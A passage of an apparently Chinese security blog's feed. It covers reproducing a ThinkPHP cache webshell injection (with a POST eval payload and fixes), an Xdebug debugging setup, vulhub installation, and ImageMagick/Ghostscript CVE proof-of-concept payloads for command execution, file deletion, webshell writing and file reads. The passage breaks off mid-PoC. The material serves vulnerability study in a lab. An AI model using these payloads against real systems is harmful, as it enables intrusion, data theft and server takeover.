DS . substr($name, 2);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if ($this-&gt;options[&#39;prefix&#39;]) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            $name &#x3D; $this-&gt;options[&#39;prefix&#39;] . DS . $name;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">        $filename &#x3D; $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        $dir      &#x3D; dirname($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if (!is_dir($dir)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            mkdir($dir, 0755, true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">        return $filename;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure></li><li><p>在index控制器写如下代码：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-5.png" alt="images"></p></li><li><p>之后访问 <code>http://localhost/public/index.php/Home/index</code>POST数据：<code>con=%0aeval($_POST[&#39;cmd&#39;]);%0d//</code></p></li><li><p>最终在 <code>runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code>文件生成shell：</p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-6.png" alt="image2"></p></li><li><p>之后访问蚁剑 <code>http://localhost/runtime/cache/b0/68931cc450442b63f5b3d276ea4297.php</code></p><p><img src="/images/tp3%E7%BC%93%E5%AD%98-7.png" alt="images3"></p></li></ul><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>在复现的时候看到CMS-hunter里对这个漏洞有这个描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">个人在复现这个漏洞的时候发现5.0.x版本的TP并不能直接访问到缓存文件所在的目录，因此可以情况下不能触发该漏洞。在3.2.x版本是可以直接从浏览器访问到缓存文件的。</span></pre></td></tr></table></figure><p>但在个人复现的时候并没有出现这个情况。</p><p>所以说一切还是自己复现一边才能填坑</p><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><ul><li><p>过滤换行符</p><p>在$data写入文件之前过滤</p><p><code>$data = str_replace(PHP_EOL, &#39;&#39;, $data);</code></p></li><li><p>禁止访问目录</p><p>在<code>Runtime</code>目录添加<code>.htaccess</code>文件，内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">deny from all</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      think系列之 thinkphp3.2.3-thinkphp5.0.10缓存漏洞复现
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="复现" scheme="http://h3art3ars.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="thinkphp" scheme="http://h3art3ars.github.io/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>xdebug特定环境配置</title>
    <link href="http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>http://h3art3ars.github.io/2019/12/12/xdebug%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2019-12-12T11:09:54.000Z</published>
    <updated>2019-12-21T13:09:00.925Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>chrome</p><p>phpstudy 8.0.9.3</p><ul><li>此法只适合文件在网站根目录，因此需要自己配置添加网站，将要调试的项目放在此目录</li><li>php 7.3.4</li></ul><p>phpstorm2019</p><h2 id="浏览器chrome配置"><a href="#浏览器chrome配置" class="headerlink" title="浏览器chrome配置"></a>浏览器chrome配置</h2><p>下载 Xdebug-helper</p><h2 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h2><ol><li><p>在此版本phpstudy中，只有php7.3.4中有php_xdebug扩展.开启此扩展。</p></li><li><p>找到对应php.ini文件。</p></li><li><p><strong>重要：搜索文件找到开启的extension项：<code>extension：php_xdebug</code> 用 <code>;</code>注释掉。因为phpstudy开启这个扩展，但需要的是<code>zend_extension</code></strong></p></li><li><p>以下内容添加到php.ini尾部</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">zend_extension&#x3D;xdebug</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[XDebug]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">;调试功能模块儿</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">;extension&#x3D;php_xdebug.dll</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">;下面是php_xdebug在phpstudy中的位置，根据情况修改，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">zend_extension &#x3D; &quot;D:\phpstudy\Extensions\php\php7.3.4nts\ext\php_xdebug.dll&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_handler&#x3D;dbgp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">xdebug.idekey&#x3D; &quot;PHPSTORM&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">;开启远程调试</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">;远程主机</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_host&#x3D;localhost</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">;主机端口，重要！！！！</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_port&#x3D;9001</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">;开启自动跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">xdebug.auto_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">;开启异常跟踪</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">xdebug.show_exception_trace &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">;开启远程调试自动启动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">xdebug.remote_autostart &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">;收集变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">;收集返回值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_return &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">;收集参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">xdebug.collect_params &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">;临时跟踪信息输出，按需修改</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">;xdebug.trace_output_dir&#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">;显示局部变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">xdebug.show_local_vars &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">xdebug.profiler_enable &#x3D; On</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">;xdebug.profiler_output_dir &#x3D;&quot;D:\phpstudy\Extensions\php\php7.3.4nts\tmp&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">xdebug.trace_enable_trigger &#x3D;On</span></pre></td></tr></table></figure></li><li><p>重启apache服务</p></li></ol><h2 id="phpstorm配置"><a href="#phpstorm配置" class="headerlink" title="phpstorm配置"></a>phpstorm配置</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a><strong>注意</strong></h3><p>每步配置完成后需点击右下角：<code>Apply</code>！！！</p><h3 id="php解释器配置"><a href="#php解释器配置" class="headerlink" title="php解释器配置"></a>php解释器配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP</p><p>php版本7.3.4。其他的正常配置解释器即可。</p><h3 id="debug配置"><a href="#debug配置" class="headerlink" title="debug配置"></a>debug配置</h3><p>File-&gt;Setting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug</p><p>此步只需更改<code>X-debug port</code>为9001，即第二步在php.ini中配置项为<code>xdebug.remote_port</code>的值</p><h3 id="DBGp-Proxy配置"><a href="#DBGp-Proxy配置" class="headerlink" title="DBGp Proxy配置"></a>DBGp Proxy配置</h3><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Debug-&gt;DBGp Proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">IDE key:PHPSTORM</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;第二步在php.ini中配置项为xdebug.idekey的值</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">HOST:http:&#x2F;&#x2F;test.com</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;为要调试的项目配置的网站。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;不要用类似于http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;test.php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Port:80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;服务器的监听地址</span></pre></td></tr></table></figure><p>File-&gt;SFetting-&gt;Language&amp;Frameworks-&gt;PHP-&gt;Server</p><ol><li>点加号添加，Name随便，下面要用。</li><li>Host填调试项目网站。eg:<a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Port:80 </li><li>Debugger:Xdebug</li></ol><h3 id="最终调试前配置"><a href="#最终调试前配置" class="headerlink" title="最终调试前配置"></a>最终调试前配置</h3><p>Run-&gt;Edit Configurations</p><ol><li>点击<code>+</code></li><li>选择Php Web Page</li><li>Name随便</li><li>Server选择上一步添加Server的Name</li><li>Start URL: <a href="http://test.com" target="_blank" rel="noopener">http://test.com</a></li><li>Browser: Chrome</li></ol><p>配置完毕</p><h3 id="食用"><a href="#食用" class="headerlink" title="食用"></a>食用</h3><p>浏览器的<code>Xdebuger helper</code>选择<code>Debug</code></p><p>phpstorm点击右上角电话图标开始监听</p><p>phpstorm点击右上角甲壳虫图标开始调试</p><p>注意不能浏览器直接访问，要点击甲壳虫图标</p><p>如果浏览器访问时，url参数含有<code>XDEBUG_SESSION_START=XXXXX</code>参数，cookie中有 <code>XDEBUG_SESSION =PHPSTORM</code>则成功</p><h3 id="后续调试超时问题"><a href="#后续调试超时问题" class="headerlink" title="后续调试超时问题"></a>后续调试超时问题</h3><p>调试时，还没调试几十秒钟就超时了。设置一下。</p><p>找到httpd.conf</p><p>查找 <code>LoadModule fcgid_module modules/mod_fcgid.so</code>模块，保证不被注释</p><p>在末尾添加以下配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;IfModule fcgid_module&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> FcgidProcessLifeTime 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"> FcgidIOTimeout 8200</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"> FcgidConnectTimeout 4000</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"> &lt;&#x2F;IfModule&gt;</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      phpstudy8.0.9(2019)+phpstorm2019+xdebug特定版本的详细配置，搭建调试环境。便于php代码的动态审计。
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="php" scheme="http://h3art3ars.github.io/tags/php/"/>
    
      <category term="调试" scheme="http://h3art3ars.github.io/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>vulhub简单安装</title>
    <link href="http://h3art3ars.github.io/2019/12/11/vulhub-install/"/>
    <id>http://h3art3ars.github.io/2019/12/11/vulhub-install/</id>
    <published>2019-12-11T07:53:39.000Z</published>
    <updated>2019-12-11T07:56:22.354Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulhub-安装使用"><a href="#vulhub-安装使用" class="headerlink" title="vulhub  安装使用"></a>vulhub  安装使用</h1><h3 id="已备环境"><a href="#已备环境" class="headerlink" title="已备环境"></a>已备环境</h3><ol><li>python3</li><li>docker</li></ol><h3 id="安装其他环境"><a href="#安装其他环境" class="headerlink" title="安装其他环境"></a>安装其他环境</h3><ol><li><p>启动docker服务</p><p><code>service docker start</code></p></li><li><p>安装docker-compose</p><p><code>pip3 install docker-compose</code></p></li></ol><h3 id="下载vulhub并解压"><a href="#下载vulhub并解压" class="headerlink" title="下载vulhub并解压"></a>下载vulhub并解压</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;archive&#x2F;master.zip -O vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">cd vulhub-master</span></pre></td></tr></table></figure><h3 id="选择并享用"><a href="#选择并享用" class="headerlink" title="选择并享用"></a>选择并享用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">cd ****&#x2F;****</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">docker-compose build</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">docker-compose down -v</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      安装vulhub以用来建立docker环境供自己练习
    
    </summary>
    
    
      <category term="学习" scheme="http://h3art3ars.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="学习" scheme="http://h3art3ars.github.io/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="漏洞利用" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ImageMagick</title>
    <link href="http://h3art3ars.github.io/2019/12/11/ImageMagick/"/>
    <id>http://h3art3ars.github.io/2019/12/11/ImageMagick/</id>
    <published>2019-12-11T07:46:16.000Z</published>
    <updated>2019-12-14T02:44:06.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h1><ul><li><h2 id="Bypass-code"><a href="#Bypass-code" class="headerlink" title="Bypass code"></a>Bypass code</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $_FILES[&#39;image&#39;][&#39;tmp_name&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$size &#x3D; getimagesize($filename);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">if ($size &amp;&amp; $size[0] &gt; 100 &amp;&amp; $size[1] &gt; 100) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    $img &#x3D; new Imagick($_FILES[&#39;image&#39;][&#39;tmp_name&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;cropThumbnailImage(100, 100);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    $img-&gt;writeImage(&#39;newimage.gif&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h3 id="ImageMagick漏洞"><a href="#ImageMagick漏洞" class="headerlink" title="ImageMagick漏洞"></a>ImageMagick漏洞</h3><ul><li><p>ImageMagick 6.9.3-9 </p></li><li><h3 id="CVE-2016-3714"><a href="#CVE-2016-3714" class="headerlink" title="CVE-2016-3714"></a>CVE-2016-3714</h3><p>与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。</p><p>ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的。</p><p>调用的漏洞委托：</p><p><code>&lt;delegate decode=&quot;https&quot; command=&quot;&amp;quot;curl&amp;quot; -s -k -o &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;&quot;/&gt;</code></p><p>漏洞poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(https:&#x2F;&#x2F;&quot;|id;&quot;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h3><p> 利用mvg格式中可以包含url的特点，进行SSRF攻击 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fill &#39;url(http:&#x2F;&#x2F;example.com&#x2F;)&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h3><p> 利用ImageMagick支持的ephemeral协议，来删除任意文件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;ephemeral:&#x2F;tmp&#x2F;delete.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h3><p> ImageMagick支持的msl协议，来进行文件的读取和写入。利用这个漏洞，可以将任意文件写为任意文件，比如将图片写为一个.php后缀的webshell </p><p> 特别说明的是，msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">file_move.mvg</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;msl:&#x2F;tmp&#x2F;msl.txt&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">popgraphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;msl.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&lt;image&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&lt;read filename&#x3D;&quot;&#x2F;tmp&#x2F;image.gif&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&lt;write filename&#x3D;&quot;&#x2F;var&#x2F;www&#x2F;shell.php&quot; &#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;image&gt;</span></pre></td></tr></table></figure></li><li><h3 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h3><p> 造成本地文件读取漏洞： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">push graphic-context</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">viewbox 0 0 640 480</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">image over 0,0 0,0 &#39;label:@&#x2F;etc&#x2F;hosts&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">pop graphic-context</span></pre></td></tr></table></figure></li><li><h3 id="Pocs"><a href="#Pocs" class="headerlink" title="Pocs"></a>Pocs</h3><p><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="noopener">Pocs</a></p></li></ul></li></ul><ul><li><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><ul><li><p>漏洞代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  new Imagick(&#39;vul.gif&#39;);</span></pre></td></tr></table></figure><p>无返回值，需从日志读取</p></li><li><h3 id="ImageMagick内存泄漏漏洞（CVE-2018-16323）"><a href="#ImageMagick内存泄漏漏洞（CVE-2018-16323）" class="headerlink" title="ImageMagick内存泄漏漏洞（CVE-2018-16323）"></a>ImageMagick内存泄漏漏洞（CVE-2018-16323）</h3></li><li><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li><p>生成PoC（ps文件）；</p></li><li><p>上传即可</p></li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">userdict &#x2F;setpagedevice undef</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">legal</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">restore</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mark &#x2F;OutputFile (%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) currentdevice putdeviceprops</span></pre></td></tr></table></figure></li><li><h3 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h3></li></ul></li></ul><ul><li><h4 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h4><ol><li>生成poc</li><li>上传即可</li></ol></li><li><p>poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">poc.png</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">______________________________________________________________________________________________</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">%!PS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td 